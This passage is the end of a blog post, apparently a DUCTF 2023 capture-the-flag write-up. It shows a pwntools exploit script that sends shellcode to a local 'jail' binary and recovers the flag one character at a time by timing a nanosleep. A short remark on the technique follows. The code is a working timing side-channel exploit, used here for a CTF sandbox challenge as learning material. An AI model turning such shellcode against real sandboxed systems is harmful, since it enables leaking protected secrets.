</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_char_at</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=n>generate_shellcode</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># r = remote(&#39;localhost&#39;, 1337)</span>
</span></span><span class=line><span class=cl>    <span class=n>elf</span><span class=o>=</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./jail&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># p=process(&#39;./jail&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./jail&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>readuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>writeline</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>readall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>time_taken</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span> 
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;time_taken = </span><span class=si>{</span><span class=n>time_taken</span><span class=si>}</span><span class=s1>s&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>math</span><span class=o>.</span><span class=n>floor</span><span class=p>(</span><span class=n>time_taken</span> <span class=o>*</span> <span class=mi>10</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;flag[</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>] = &#34;</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s1>&#34;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>get_char_at</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>44</span><span class=p>)])</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;flag = &#34;</span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s1>&#34;&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>Instead of an exit code they use a nanosleep and time how long the application runs for. What was cool to me is how they push the data in the struct onto the stack and pass the stack pointer register.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://fliqqs.github.io/tags/pwn/>pwn</a></li><li><a href=https://fliqqs.github.io/tags/ductf/>ductf</a></li></ul><nav class=paginav><a class=prev href=https://fliqqs.github.io/posts/cyber_skills_challenge/cyber_skills_challenge/><span class=title>Â« Prev</span><br><span>AU Cyber Skills Challenge</span></a>
<a class=next href=https://fliqqs.github.io/posts/pico_gym/pico_gym/><span class=title>Next Â»</span><br><span>picogym writeups</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share DUCTF23 on twitter" href="https://twitter.com/intent/tweet/?text=DUCTF23&url=https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f&hashtags=pwn%2cductf"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DUCTF23 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f&title=DUCTF23&summary=DUCTF23&source=https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DUCTF23 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f&title=DUCTF23"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DUCTF23 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DUCTF23 on whatsapp" href="https://api.whatsapp.com/send?text=DUCTF23%20-%20https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DUCTF23 on telegram" href="https://telegram.me/share/url?text=DUCTF23&url=https%3a%2f%2ffliqqs.github.io%2fposts%2fductf23%2fductf23%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://fliqqs.github.io/>fliqqs blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>